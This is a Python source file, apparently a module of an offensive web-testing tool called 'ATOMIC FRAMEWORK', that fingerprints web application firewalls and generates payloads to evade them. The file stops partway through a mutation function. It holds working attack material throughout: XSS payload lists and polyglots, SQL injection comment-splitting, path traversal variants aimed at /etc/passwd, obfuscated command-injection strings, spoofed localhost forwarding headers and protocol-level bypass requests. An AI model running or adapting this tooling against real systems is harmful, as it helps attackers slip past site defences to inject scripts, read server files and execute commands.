#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK v9.0 - ULTIMATE EDITION
WAF Bypass Module - Advanced techniques
"""

import re
import random


from config import Colors


# Probability thresholds for mutation/bypass randomization
_HOMOGLYPH_SUBSTITUTION_PROB = 0.5   # chance of replacing a char with its homoglyph
_COMMENT_INJECTION_PROB = 0.3        # chance of inserting a comment between chars


class WAFBypass:
    """WAF Bypass Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "WAF Bypass"
    
    def detect_waf(self, url: str) -> list:
        """Detect WAF type via passive header/cookie/content checks and active probing.

        Signature database is compiled from the WafW00f GitHub repository
        (EnableSecurity/wafw00f) and other community WAF-detection sources.
        """
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare', '__cfduid', 'cf_clearance', 'cf-cache-status', 'cf-request-id'],
            'AWS WAF': ['awselb', 'aws-waf', 'x-amzn-requestid', 'x-amzn-errortype', 'x-amz-cf-id'],
            'ModSecurity': ['mod_security', 'ModSecurity', 'NOYB', 'modsecurity'],
            'Sucuri': ['sucuri', 'x-sucuri', 'sucuri_cloudproxy', 'sucuri-cache'],
            'Incapsula': ['incap_ses', 'visid_incap', 'incapsula', 'x-iinfo'],
            'Akamai': ['akamai', 'ak_bmsc', 'x-akamai-transformed', 'akamai-ghost'],
            'F5 BIG-IP': ['bigip', 'f5', 'x-waf-status', 'bigipserver', 'x-cnection'],
            'Imperva': ['incap_ses', 'visid_incap', 'imperva', 'x-iinfo', 'incapsula'],
            'Barracuda': ['barra', 'barracuda', 'barra_counter_session'],
            'Fortinet': ['fortigate', 'fgd', 'fortiwafd', 'fortiwaf'],
            'Wordfence': ['wordfence', 'wf', 'wordfence_loginhash'],
            'Citrix': ['citrix', 'ns_af', 'citrix_ns', 'ns-nonce'],
            'Radware': ['radware', 'x-info', 'x-sl-compstate'],
            'DenyAll': ['denyhosts', 'denyall', 'sessioncookie'],
            'SonicWall': ['sonicwall', 'dell', 'snwl'],
            'Palo Alto': ['paloalto', 'pa-fw', 'palo alto'],
            'Alibaba Cloud': ['alicloud', 'yundun', 'ali-cdn'],
            'Tencent Cloud': ['tencent', 'waf.tencent', 'tencent-cloud'],
            'Azure WAF': ['azure', 'x-azure', 'azure-ref', 'x-ms-request-id'],
            'Google Cloud Armor': ['google', 'x-goog', 'x-gfe', 'x-cloud-trace-context'],
            'Reblaze': ['reblaze', 'rbzid'],
            'StackPath': ['stackpath', 'stackpath-waf'],
            'Fastly': ['fastly', 'x-fastly', 'x-served-by', 'fastly-restarts'],
            # Additional WAFs from WafW00f / community
            'Comodo WAF': ['x-waf-event-info', 'comodo'],
            'DDoS-Guard': ['ddos-guard', 'ddos_guard'],
            'LiteSpeed': ['litespeed', 'x-litespeed'],
            'Wallarm': ['wallarm', 'nginx-wallarm'],
            'Varnish': ['x-varnish', 'via: varnish'],
            'Edgecast': ['ecdf', 'x-ec-custom-error'],
            'KeyCDN': ['keycdn', 'x-pull-origin'],
            'Netlify': ['x-nf-request-id', 'netlify'],
            'Vercel': ['x-vercel-id', 'x-vercel-cache'],
            'Shadow Daemon': ['shadow daemon'],
            'Safe3WAF': ['safe3', 'safe3waf'],
            'NAXSI': ['naxsi', 'x-naxsi'],
            'WebKnight': ['webknight'],
            'BulletProof': ['bulletproof'],
            'AnYu WAF': ['anyu', 'x-anyu'],
            'Safedog': ['safedog', 'waf-safedog'],
            'Chaitin SafeLine': ['chaitin', 'safeline'],
        }
        
        try:
            response = self.requester.request(url, 'GET')
            
            if not response:
                return []
            
            headers = str(response.headers).lower()
            cookies = str(response.cookies).lower()
            content = response.text.lower()
            
            detected = []
            for waf, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig.lower() in headers or sig.lower() in cookies or sig.lower() in content:
                        detected.append(waf)
                        break
            
            # Active probing: send a clearly malicious request
            if not detected:
                try:
                    from urllib.parse import urlparse, urlunparse, urlencode, parse_qs
                    parsed = urlparse(url)
                    probe_query = urlencode({'test': '<script>alert(1)</script>'})
                    probe_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, probe_query, parsed.fragment,
                    ))
                    probe_response = self.requester.request(probe_url, 'GET')
                    if probe_response:
                        # Check for blocking status codes
                        if probe_response.status_code in (403, 406, 429):
                            detected.append('Generic WAF (active probe)')
                        # Check for known block page content
                        probe_content = probe_response.text.lower()
                        block_indicators = [
                            'access denied', 'blocked', 'security',
                            'firewall', 'forbidden', 'not acceptable',
                        ]
                        for indicator in block_indicators:
                            if indicator in probe_content:
                                if 'Generic WAF (active probe)' not in detected:
                                    detected.append('Generic WAF (active probe)')
                                break
                        # Re-check WAF signatures against probe response
                        probe_headers = str(probe_response.headers).lower()
                        probe_cookies = str(probe_response.cookies).lower()
                        for waf, signatures in waf_signatures.items():
                            if waf in detected:
                                continue
                            for sig in signatures:
                                if (sig.lower() in probe_headers or
                                        sig.lower() in probe_cookies or
                                        sig.lower() in probe_content):
                                    detected.append(waf)
                                    break
                except Exception:
                    pass
            
            return detected
            
        except Exception as e:
            if self.engine.config.get('verbose'):
                print(f"{Colors.error(f'WAF detection error: {e}')}")
            return []
    
    def waf_specific_bypasses(self, payload: str, waf_type: str) -> list:
        """Generate WAF-specific bypass payloads based on detected WAF type.
        
        Args:
            payload: The original payload to transform.
            waf_type: The detected WAF type string.
        
        Returns:
            List of WAF-specific bypass payload variants.
        """
        variants = []
        waf_lower = waf_type.lower()
        
        if 'cloudflare' in waf_lower:
            # Unicode normalization (NFKC) — Cloudflare normalizes before matching
            import unicodedata
            variants.append(unicodedata.normalize('NFKC', payload))
            variants.append(unicodedata.normalize('NFD', payload))
            # Chunked transfer encoding bypass
            chunks = []
            for i in range(0, len(payload), 2):
                chunk = payload[i:i + 2]
                chunks.append(f'{len(chunk):x}\r\n{chunk}\r\n')
            chunks.append('0\r\n\r\n')
            variants.append(''.join(chunks))
            # HTTP/2 pseudo-header trick — mixed case method
            variants.append(payload.replace('<', '\uff1c').replace('>', '\uff1e'))
            # Fullwidth character substitution
            variants.append(''.join(
                chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c
                for c in payload
            ))
        
        elif 'modsecurity' in waf_lower:
            # Paranoia-level-aware bypasses — version-specific comment syntax
            variants.append(re.sub(
                r'(SELECT|UNION|INSERT|UPDATE|DELETE|DROP|ALTER)',
                lambda m: f'/*!50000{m.group(0)}*/',
                payload, flags=re.IGNORECASE
            ))
            variants.append(re.sub(
                r'(SELECT|UNION|INSERT|UPDATE|DELETE)',
                lambda m: f'/*!{m.group(0)}*/',
                payload, flags=re.IGNORECASE
            ))
            # Nested comments
            variants.append(payload.replace('/*', '/****').replace('*/', '****/'))
            # Whitespace alternatives that bypass CRS rules
            for ws in ['%09', '%0a', '%0d', '%0b']:
                variants.append(payload.replace(' ', ws))
        
        elif 'aws' in waf_lower:
            # Case mixing
            variants.append(''.join(
                c.upper() if random.random() < 0.5 else c.lower() for c in payload
            ))
            # Concatenation splitting
            variants.append(payload.replace('SELECT', "SELE"+"CT").replace('UNION', "UNI"+"ON"))
            # IP rotation headers to confuse origin detection
            fake_ips = ['10.0.0.1', '172.16.0.1', '192.168.1.1']
            for ip in fake_ips:
                variants.append(payload)  # payload unchanged, headers differ
            # Double URL encoding
            variants.append(''.join(f'%25{ord(c):02x}' for c in payload))
        
        elif 'akamai' in waf_lower:
            # Long headers (4KB+) — padding to push payload past inspection buffer
            padding = 'X' * 4096
            variants.append(padding + payload)
            variants.append(payload + padding)
            # Multipart boundary confusion
            boundary = ''.join(random.choices('abcdefghijklmnop', k=32))
            multipart = (
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="a"\r\n\r\n'
                f'{padding}\r\n'
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="input"\r\n\r\n'
                f'{payload}\r\n--{boundary}--'
            )
            variants.append(multipart)
            # Fragment payload across parameters
            mid = len(payload) // 2
            variants.append(f'{payload[:mid]}%00{payload[mid:]}')
        
        elif 'imperva' in waf_lower or 'incapsula' in waf_lower:
            # Encoding chains — layer multiple encodings
            single_enc = ''.join(f'%{ord(c):02x}' for c in payload)
            double_enc = ''.join(f'%25{ord(c):02x}' for c in payload)
            variants.append(single_enc)
            variants.append(double_enc)
            # HTML entity + URL encode mix
            variants.append(''.join(
                f'&#{ord(c)};' if i % 2 == 0 else f'%{ord(c):02x}'
                for i, c in enumerate(payload)
            ))
            # Cookie manipulation — payload in cookie header
            variants.append(payload)
            # JavaScript challenge bypass headers hint
            variants.append(payload.replace(' ', '/**/'))
        
        return variants
    
    def protocol_level_bypasses(self, url: str, payload: str) -> list:
        """Generate protocol-level bypass request configurations.
        
        Args:
            url: The target URL.
            payload: The payload to include in bypass requests.
        
        Returns:
            List of dicts, each describing a bypass request configuration.
        """
        from urllib.parse import urlparse
        parsed = urlparse(url)
        bypasses = []
        
        # HTTP verb tampering — use uncommon methods
        for method in ['PROPFIND', 'MOVE', 'COPY', 'MKCOL']:
            bypasses.append({
                'url': url,
                'method': method,
                'data': payload,
                'headers': {},
                'technique': f'verb_tamper_{method}',
            })
        
        # Header line folding (HTTP/1.1) — fold long header values with CRLF+space
        folded_payload = '\r\n '.join(
            payload[i:i + 20] for i in range(0, len(payload), 20)
        )
        bypasses.append({
            'url': url,
            'method': 'GET',
            'data': None,
            'headers': {'X-Custom-Payload': folded_payload},
            'technique': 'header_line_folding',
        })
        
        # Duplicate headers — same header name multiple times with different values
        # Represented as a list of tuples for consumers that support raw header lists
        bypasses.append({
            'url': url,
            'method': 'POST',
            'data': payload,
            'headers': {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Forwarded-For': '127.0.0.1',
            },
            'extra_headers': [
                ('Content-Type', 'text/plain'),
                ('Content-Type', 'multipart/form-data'),
            ],
            'technique': 'duplicate_headers',
        })
        
        # Request line manipulation — absolute URI in request line
        absolute_uri = f'{parsed.scheme}://{parsed.netloc}{parsed.path}'
        bypasses.append({
            'url': absolute_uri,
            'method': 'GET',
            'data': {'input': payload},
            'headers': {'Host': parsed.netloc},
            'technique': 'absolute_uri_request_line',
        })
        
        # Content-Length: 0 with body — some WAFs skip body if CL=0
        bypasses.append({
            'url': url,
            'method': 'POST',
            'data': payload,
            'headers': {
                'Content-Length': '0',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            'technique': 'content_length_zero_with_body',
        })
        
        return bypasses
    
    def bypass_techniques(self, payload: str, waf_type: str = None) -> list:
        """Generate WAF bypass variants"""
        variants = [payload]
        
        # URL encoding
        variants.append(self._url_encode(payload))
        variants.append(self._double_url_encode(payload))
        
        # Case randomization
        variants.append(self._random_case(payload))
        
        # Comment injection (SQL specific)
        if any(kw in payload.upper() for kw in ['SELECT', 'UNION', 'AND', 'OR']):
            variants.append(self._comment_injection(payload))
        
        # Unicode encoding
        variants.append(self._unicode_encode(payload))
        
        # HTML entities
        variants.append(self._html_entities(payload))
        
        # Hex encoding
        variants.append(self._hex_encode(payload))
        
        # Null byte injection
        variants.append(self._null_byte(payload))
        
        # Tab/space substitution
        variants.append(self._whitespace_substitution(payload))
        
        # Keyword splitting
        variants.append(self._keyword_splitting(payload))
        
        return list(set(variants))
    
    def _url_encode(self, payload: str) -> str:
        """URL encode payload"""
        return ''.join(f'%{ord(c):02x}' for c in payload)
    
    def _double_url_encode(self, payload: str) -> str:
        """Double URL encode payload"""
        return ''.join(f'%25{ord(c):02x}' for c in payload)
    
    def _random_case(self, payload: str) -> str:
        """Randomize case"""
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
    
    def _comment_injection(self, payload: str) -> str:
        """Inject SQL comments"""
        sql_keywords = {
            'SELECT': 'SEL/**/ECT',
            'UNION': 'UNI/**/ON',
            'AND': 'AN/**/D',
            'OR': 'O/**/R',
            'FROM': 'FR/**/OM',
            'WHERE': 'WHE/**/RE',
            'ORDER': 'ORD/**/ER',
            'GROUP': 'GR/**/OUP',
            'BY': 'B/**/Y',
            'INSERT': 'INS/**/ERT',
            'UPDATE': 'UP/**/DATE',
            'DELETE': 'DEL/**/ETE',
        }
        
        result = payload
        for keyword, replacement in sql_keywords.items():
            result = re.sub(re.escape(keyword), replacement, result, flags=re.IGNORECASE)
        
        return result
    
    def _unicode_encode(self, payload: str) -> str:
        """Unicode encode payload"""
        return ''.join(f'%u{ord(c):04x}' for c in payload)
    
    def _html_entities(self, payload: str) -> str:
        """HTML entity encode"""
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    def _hex_encode(self, payload: str) -> str:
        """Hex encode payload"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    def _null_byte(self, payload: str) -> str:
        """Insert null bytes"""
        # Insert null byte at common injection points
        return payload.replace('.', '%00.').replace('/', '%00/')
    
    def _whitespace_substitution(self, payload: str) -> str:
        """Substitute whitespace"""
        # Replace spaces with SQL comments or tab characters
        result = payload.replace(' ', '/**/')
        return result
    
    def _keyword_splitting(self, payload: str) -> str:
        """Split keywords with junk characters"""
        # Insert junk characters that are ignored
        return payload.replace('<script>', '<scr ipt>').replace('alert', 'al\\x65rt')
    
    def generate_bypass_request(self, url: str, method: str = 'GET', 
                                data: dict = None, headers: dict = None) -> dict:
        """Generate request with WAF bypass headers"""
        bypass_headers = {
            'X-Originating-IP': '127.0.0.1',
            'X-Forwarded-For': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Forwarded-Host': 'localhost',
            'X-Forwarded-Proto': 'https',
            'X-HTTP-Host-Override': 'localhost',
            'Forwarded': 'for=127.0.0.1;by=127.0.0.1;host=localhost',
        }
        
        if headers:
            bypass_headers.update(headers)
        
        return {
            'url': url,
            'method': method,
            'data': data,
            'headers': bypass_headers,
        }
    
    def xss_waf_evasion(self, base_payload: str = None) -> list:
        """Generate specialized XSS payloads designed to bypass WAF rules.
        
        Implements multiple evasion techniques including event handler obfuscation,
        SVG/MathML context payloads, protocol handler tricks, encoding chains,
        DOM-based sinks, template literal abuse, mutation XSS patterns, and
        polyglot payloads combining multiple contexts.
        
        Args:
            base_payload: Optional base payload to build upon. If None, generates
                          a comprehensive set of standalone evasion payloads.
        
        Returns:
            List of XSS bypass payloads designed to evade WAF rules.
        """
        payloads = []
        
        alert_payload = base_payload if base_payload else 'alert(1)'
        # Strip surrounding script tags if present for embedding
        inner = re.sub(r'</?script[^>]*>', '', alert_payload, flags=re.IGNORECASE).strip()
        if not inner:
            inner = 'alert(1)'
        
        # --- Event handler obfuscation (case mixing) ---
        event_handlers = [
            'oNLoAd', 'ONERROR', 'oNmOuSeOvEr', 'oNfOcUs', 'oNcLiCk',
            'ONmouseover', 'oNeRrOr', 'OnLoAd', 'oNaNiMaTiOnEnD',
            'oNtRaNsItIoNeNd', 'oNpOiNtErOvEr',
        ]
        for handler in event_handlers:
            payloads.append(f'<img src=x {handler}={inner}>')
            payloads.append(f'<body {handler}={inner}>')
            payloads.append(f'<input {handler}={inner} autofocus>')
        
        # --- SVG/MathML context payloads ---
        payloads.extend([
            f'<svg/onload={inner}>',
            f"<svg onload={inner}//'>",
            f'<svg/onload="{inner}">',
            f'<svg><script>{inner}</script></svg>',
            f'<svg><animate onbegin={inner} attributeName=x>',
            f'<svg><set onbegin={inner} attributeName=x>',
            f'<math><mtext><table><mglyph><svg><mtext><textarea><path id="x">',
            f'<math><mtext><img src=x onerror={inner}>',
            f'<svg><foreignObject><body onload={inner}>',
            f'<svg><desc><template><img src=x onerror={inner}>',
        ])
        
        # --- Protocol handler tricks ---
        encoded_inner = ''.join(f'&#x{ord(c):x};' for c in inner)
        payloads.extend([
            f'<a href="javascript:{inner}">click</a>',
            f'<a href="javascript:{encoded_inner}">click</a>',
            f'<a href="data:text/html,<script>{inner}</script>">click</a>',
            f'<a href="data:text/html;base64,{self._base64_encode("<script>" + inner + "</script>")}">click</a>',
            f'<a href="vbscript:MsgBox(1)">click</a>',
            f'<iframe src="javascript:{inner}">',
            f'<object data="javascript:{inner}">',
            f'<embed src="data:text/html,<script>{inner}</script>">',
            f'<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;{inner}">click</a>',
            f'<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;{inner}">click</a>',
        ])
        
        # --- Encoding chains (HTML entity -> URL encode -> Unicode) ---
        html_chain = ''.join(f'&#{ord(c)};' for c in inner)
        url_chain = ''.join(f'%{ord(c):02x}' for c in inner)
        unicode_chain = ''.join(f'\\u{ord(c):04x}' for c in inner)
        mixed_chain = ''
        for i, c in enumerate(inner):
            if i % 3 == 0:
                mixed_chain += f'&#{ord(c)};'
            elif i % 3 == 1:
                mixed_chain += f'%{ord(c):02x}'
            else:
                mixed_chain += f'\\u{ord(c):04x}'
        
        payloads.extend([
            f'<img src=x onerror="{html_chain}">',
            f'<img src=x onerror="{url_chain}">',
            f'<script>{unicode_chain}</script>',
            f'<img src=x onerror="{mixed_chain}">',
        ])
        
        # --- DOM-based sinks ---
        payloads.extend([
            f'<script>document.write("<img src=x onerror={inner}>")</script>',
            f'<script>document.body.innerHTML="<img src=x onerror={inner}>"</script>',
            f'<script>eval(atob("{self._base64_encode(inner)}"))</script>',
            f'<script>eval("al"+"ert(1)")</script>',
            f'<script>window["eval"]({inner})</script>',
            f'<script>this["alert"](1)</script>',
            f'<script>self["alert"](1)</script>',
            f'<script>[].constructor.constructor("return alert(1)")()</script>',
            f'<script>Function("alert(1)")()</script>',
            f'<script>setTimeout("{inner}",0)</script>',
        ])
        
        # --- Template literal abuse ---
        payloads.extend([
            '<script>`${alert(1)}`</script>',
            '<script>tag`${alert(1)}`</script>',
            '<script>${{alert(1)}}</script>',
            f'<script>`${{String.fromCharCode(97,108,101,114,116)(1)}}`</script>',
            f'<img src=x onerror=`{inner}`>',
        ])
        
        # --- Mutation XSS patterns ---
        payloads.extend([
            f'<noscript><p title="</noscript><img src=x onerror={inner}>">',
            f'<textarea><script>{inner}</script></textarea>',
            f'<template><img src=x onerror={inner}></template>',
            f'<noembed><img src=x onerror={inner}></noembed>',
            f'<xmp><img src=x onerror={inner}></xmp>',
            f'<title><img src=x onerror={inner}></title>',
            f'<style><img src=x onerror={inner}></style>',
            f'<iframe srcdoc="<img src=x onerror={inner}>">',
            f'<noscript><img src=x onerror={inner}></noscript>',
            f'<select><template><img src=x onerror={inner}></template></select>',
        ])
        
        # --- Polyglot payloads combining multiple contexts ---
        # Polyglot that escapes JS comments, HTML tags, and URL-encoded contexts
        payloads.extend([
            f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk={inner} )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={inner}//>',
            f'"><img src=x onerror={inner}>//',
            f'\'"--><svg/onload={inner}>',
            f'</script><svg/onload={inner}>',
            f'-"-\'><svg/onload={inner}>{{{{{{1}}}}}}<img src=x onerror={inner}>',
            f'{{{{constructor.constructor("return this")().alert(1)}}}}',
            f'<div onpointerover="{inner}">MOVE HERE</div>',
            f'%3Csvg%20onload%3D{inner}%3E',
            f'<details open ontoggle={inner}>',
            f'<marquee onstart={inner}>',
        ])
        
        return payloads
    
    def _base64_encode(self, inner: str) -> str:
        """Base64 encode a string for use in evasion payloads.
        
        Uses a pure-Python base64 implementation to avoid additional imports.
        
        Args:
            inner: String to encode.
        
        Returns:
            Base64-encoded string.
        """
        # Standard base64 alphabet
        b64_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        data = inner.encode('utf-8')
        result = []
        # Process 3 bytes at a time → 4 base64 characters (RFC 4648)
        for i in range(0, len(data), 3):
            chunk = data[i:i + 3]
            # Left-align partial chunks in a 24-bit integer
            n = int.from_bytes(chunk, 'big') << (8 * (3 - len(chunk)))
            num_output = len(chunk) + 1  # 1 byte→2 chars, 2→3, 3→4
            for j in range(num_output):
                # Extract 6-bit groups from the 24-bit integer
                result.append(b64_chars[(n >> (18 - 6 * j)) & 0x3F])
            result.extend(['='] * (4 - num_output))  # pad to 4-char boundary
        return ''.join(result)
    
    def regex_bypass_generate(self, payload: str, context: str = 'xss') -> list:
        """Analyze common WAF regex patterns and generate bypass variants.
        
        Applies context-aware transformations to evade regex-based WAF rules
        using character substitution, null byte insertion, comment injection,
        alternate encoding, concatenation splitting, case alternation,
        whitespace alternatives, and context-specific bypasses.
        
        Args:
            payload: The original payload to generate bypass variants for.
            context: The attack context type. One of 'sql', 'xss',
                     'path_traversal', or 'cmdi'. Defaults to 'xss'.
        
        Returns:
            List of regex-bypass payload variants.
        """
        variants = []
        
        # --- Character substitution (Unicode homoglyphs) ---
        homoglyphs = {
            'a': '\u0430', 'e': '\u0435', 'o': '\u043e', 'p': '\u0440',
            'c': '\u0441', 'x': '\u0445', 's': '\u0455', 'i': '\u0456',
            'A': '\u0410', 'E': '\u0415', 'O': '\u041e', 'S': '\u0405',
            'T': '\u0422', 'H': '\u041d', 'B': '\u0412', 'M': '\u041c',
        }
        homoglyph_payload = ''
        for c in payload:
            if c in homoglyphs and random.random() < _HOMOGLYPH_SUBSTITUTION_PROB:
                homoglyph_payload += homoglyphs[c]
            else:
                homoglyph_payload += c
        variants.append(homoglyph_payload)
        
        # Full homoglyph substitution variant
        full_homoglyph = ''.join(homoglyphs.get(c, c) for c in payload)
        variants.append(full_homoglyph)
        
        # --- Null byte insertion (%00) between keywords ---
        keywords = ['select', 'union', 'script', 'alert', 'onerror',
                     'onload', 'eval', 'exec', 'passwd', 'shadow']
        null_payload = payload
        for kw in keywords:
            if kw in null_payload.lower():
                idx = null_payload.lower().find(kw)
                mid = len(kw) // 2
                original_kw = null_payload[idx:idx + len(kw)]
                null_payload = (null_payload[:idx + mid] + '%00' +
                                null_payload[idx + mid:])
        variants.append(null_payload)
        
        # --- Comment insertion (/**/, --, #) within SQL/HTML ---
        comment_styles = ['/**/', '/*!*/', '/*! */', '-- -\n', '#\n']
        for comment in comment_styles:
            commented = ''
            i = 0
            while i < len(payload):
                commented += payload[i]
                if payload[i].isalpha() and i + 1 < len(payload) and payload[i + 1].isalpha():
                    if random.random() < _COMMENT_INJECTION_PROB:
                        commented += comment
                i += 1
            variants.append(commented)
        
        # --- Alternate encoding representation ---
        # Octal encoding
        variants.append(''.join(f'\\{ord(c):03o}' for c in payload))
        # Hex encoding
        variants.append(''.join(f'\\x{ord(c):02x}' for c in payload))
        # HTML decimal entities
        variants.append(''.join(f'&#{ord(c)};' for c in payload))
        # HTML hex entities
        variants.append(''.join(f'&#x{ord(c):x};' for c in payload))
        
        # --- Concatenation splitting ---
        split_keywords = {
            'select': "'sel'+'ect'", 'union': "'un'+'ion'",
            'alert': "'al'+'ert'", 'script': "'scr'+'ipt'",
            'eval': "'ev'+'al'", 'document': "'doc'+'ument'",
            'cookie': "'coo'+'kie'", 'window': "'win'+'dow'",
            'onload': "'on'+'load'", 'onerror': "'on'+'error'",
        }
        concat_payload = payload
        for kw, replacement in split_keywords.items():
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            concat_payload = pattern.sub(replacement, concat_payload)
        variants.append(concat_payload)
        
        # JS concat variant
        js_concat_payload = payload
        for kw in split_keywords:
            if kw in js_concat_payload.lower():
                idx = js_concat_payload.lower().find(kw)
                original = js_concat_payload[idx:idx + len(kw)]
                mid = len(original) // 2
                js_replacement = f'{original[:mid]}"+"{original[mid:]}'
                js_concat_payload = (js_concat_payload[:idx] + js_replacement +
                                     js_concat_payload[idx + len(kw):])
        variants.append(js_concat_payload)
        
        # --- Case alternation pattern ---
        # sElEcT style
        variants.append(''.join(
            c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)
        ))
        # Inverse: sElEcT -> SeLeCt
        variants.append(''.join(
            c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(payload)
        ))
        # Random case variant
        variants.append(''.join(
            c.upper() if random.random() < 0.5 else c.lower() for c in payload
        ))
        
        # --- Whitespace alternatives ---
        ws_alternatives = ['%09', '%0a', '%0b', '%0c', '%0d', '%a0',
                           '+', '%20', '%09%0a', '/**/']
        for ws in ws_alternatives:
            variants.append(payload.replace(' ', ws))
        
        # --- Context-specific bypasses ---
        if context == 'sql':
            variants.extend(self._sql_context_bypasses(payload))
        elif context == 'xss':
            variants.extend(self._xss_context_bypasses(payload))
        elif context == 'path_traversal':
            variants.extend(self._path_traversal_context_bypasses(payload))
        elif context == 'cmdi':
            variants.extend(self._cmdi_context_bypasses(payload))
        
        return variants
    
    def _sql_context_bypasses(self, payload: str) -> list:
        """Generate SQL-specific regex bypass variants.
        
        Args:
            payload: The original SQL payload.
        
        Returns:
            List of SQL context bypass variants.
        """
        variants = []
        # Version-specific MySQL comments
        variants.append(re.sub(
            r'(SELECT|UNION|INSERT|UPDATE|DELETE)',
            lambda m: f'/*!50000{m.group(0)}*/',
            payload, flags=re.IGNORECASE
        ))
        # Inline comments between every keyword character
        variants.append(re.sub(
            r'(SELECT|UNION)',
            lambda m: '/**/'.join(m.group(0)),
            payload, flags=re.IGNORECASE
        ))
        # Scientific notation for numeric contexts
        variants.append(payload.replace(' 1', ' 1e0').replace(' 0', ' 0e0'))
        # LIKE-based equivalences
        variants.append(payload.replace('=', ' LIKE '))
        variants.append(payload.replace('=', ' REGEXP '))
        # Parenthesis wrapping
        variants.append(re.sub(
            r'(SELECT|UNION ALL SELECT)',
            lambda m: f'({m.group(0)})',
            payload, flags=re.IGNORECASE
        ))
        return variants
    
    def _xss_context_bypasses(self, payload: str) -> list:
        """Generate XSS-specific regex bypass variants.
        
        Args:
            payload: The original XSS payload.
        
        Returns:
            List of XSS context bypass variants.
        """
        variants = []
        # Tag name variations
        variants.append(payload.replace('<script', '<SCRIPT').replace('</script', '</SCRIPT'))
        variants.append(payload.replace('<script', '<ScRiPt').replace('</script', '</ScRiPt'))
        # Slash variations
        variants.append(payload.replace('<script>', '<script/>'))
        variants.append(payload.replace('<script>', '<script >'))
        # Event handler padding
        variants.append(re.sub(
            r'(on\w+)=',
            lambda m: f'{m.group(1)}  =',
            payload, flags=re.IGNORECASE
        ))
        # Newline in tag
        variants.append(payload.replace('<', '<\n').replace('>', '\n>'))
        # Tab in attributes
        variants.append(payload.replace('=', '\t=\t'))
        # JS URI scheme variations
        variants.append(payload.replace('javascript:', 'javascript\t:'))
        variants.append(payload.replace('javascript:', 'java\x00script:'))
        return variants
    
    def _path_traversal_context_bypasses(self, payload: str) -> list:
        """Generate path traversal specific regex bypass variants.
        
        Args:
            payload: The original path traversal payload.
        
        Returns:
            List of path traversal context bypass variants.
        """
        variants = []
        variants.append(payload.replace('../', '..\\'))
        variants.append(payload.replace('../', '....//'))
        variants.append(payload.replace('../', '..%252f'))
        variants.append(payload.replace('../', '%2e%2e/'))
        variants.append(payload.replace('../', '%2e%2e%2f'))
        variants.append(payload.replace('../', '..%c0%af'))
        variants.append(payload.replace('../', '..%ef%bc%8f'))
        variants.append(payload.replace('etc/passwd', 'etc%00/passwd'))
        return variants
    
    def _cmdi_context_bypasses(self, payload: str) -> list:
        """Generate command injection specific regex bypass variants.
        
        Args:
            payload: The original command injection payload.
        
        Returns:
            List of command injection context bypass variants.
        """
        variants = []
        # Quoting tricks
        variants.append(payload.replace('cat', "c'a't"))
        variants.append(payload.replace('cat', 'c"a"t'))
        variants.append(payload.replace('cat', 'c\\at'))
        # Variable expansion
        variants.append(payload.replace('cat', '${IFS}cat'))
        variants.append(payload.replace(' ', '${IFS}'))
        variants.append(payload.replace(' ', '$IFS$9'))
        variants.append(payload.replace(' ', '{,}'))
        # Wildcard tricks
        variants.append(payload.replace('/etc/passwd', '/e?c/p?sswd'))
        variants.append(payload.replace('/etc/passwd', '/e*/passwd'))
        # Operator alternatives
        variants.append(payload.replace(';', '%0a'))
        variants.append(payload.replace(';', '|'))
        variants.append(payload.replace(';', '||'))
        variants.append(payload.replace(';', '&&'))
        return variants
    
    def custom_mutation_engine(self, payload: str, rounds: int = 3) -> list:
        """Apply multiple rounds of mutations to payloads while preserving
        semantic intent.
        
        Mutation operators include bit flipping, junk character insertion,
        boundary condition exploits, content-type confusion, HTTP parameter
        pollution variants, double encoding chains, and chunked transfer
        encoding variations.
        
        Args:
            payload: The original payload to mutate.
            rounds: Number of mutation rounds to apply. Defaults to 3.
        
        Returns:
            List of mutated payload variants.
        """
        mutation_operators = [
            self._mutate_bit_flip,
            self._mutate_junk_insert,
            self._mutate_boundary_exploit,
            self._mutate_content_type_confusion,
            self._mutate_hpp,
            self._mutate_double_encode,
            self._mutate_chunked_variation,
        ]
        
        variants = []
        current_payloads = [payload]
        
        for _round in range(rounds):
            next_payloads = []
            for current in current_payloads:
                operator = random.choice(mutation_operators)
                mutated = operator(current)
                if mutated and mutated != current:
                    next_payloads.append(mutated)
                    variants.append(mutated)
            if next_payloads:
                current_payloads = next_payloads
            else:
                break
        
        # Also generate one variant per operator directly from original
        for operator in mutation_operators:
            mutated = operator(payload)
            if mutated:
                variants.append(mutated)
        
        return variants
    
    def _mutate_bit_flip(self, payload: str) -> str:
        """Apply bit flipping on specific characters.
        
        Flips a single bit in a randomly chosen character of the payload,
        targeting non-structural characters to preserve semantic meaning.
        
        Args:
            payload: The payload to mutate.
        
        Returns:
            Payload with one character bit-flipped.
        """
        if not payload:
            return payload
        chars = list(payload)
        # Find candidate positions (alphanumeric only to preserve structure)
        candidates = [i for i, c in enumerate(chars) if c.isalnum()]
        if not candidates:
            return payload
        idx = random.choice(candidates)
